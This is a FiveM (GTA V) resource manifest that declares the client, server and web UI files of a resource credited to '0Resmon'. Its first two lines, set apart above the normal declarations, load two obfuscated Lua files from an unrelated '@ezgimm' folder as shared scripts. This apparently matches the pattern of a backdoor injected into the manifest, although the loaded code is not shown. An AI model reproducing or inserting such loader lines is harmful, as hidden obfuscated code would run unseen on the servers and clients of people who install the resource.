shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'



fx_version 'adamant'

game 'gta5'

author "0Resmon"

description "Created by 0Resmon / discord.gg/0resmon"

lua54 'yes'

ui_page "web/index.html"

client_scripts { 
  'framework.lua',
  'config.lua',  
  'client.lua' 
}
 
server_scripts { '@mysql-async/lib/MySQL.lua', 'framework.lua', 'config.lua',  'server.lua' }

files {
    'web/index.html',
    'web/s4.js',
    'web/style.css',
    'web/*.png',
    'web/*.ttf',
    'web/*.gif',
}

escrow_ignore {
  'config.lua', 'framework.lua' , 'client.lua',  'server.lua'
} 

shared_script '@ox_lib/init.lua'

dependency '/assetpacks'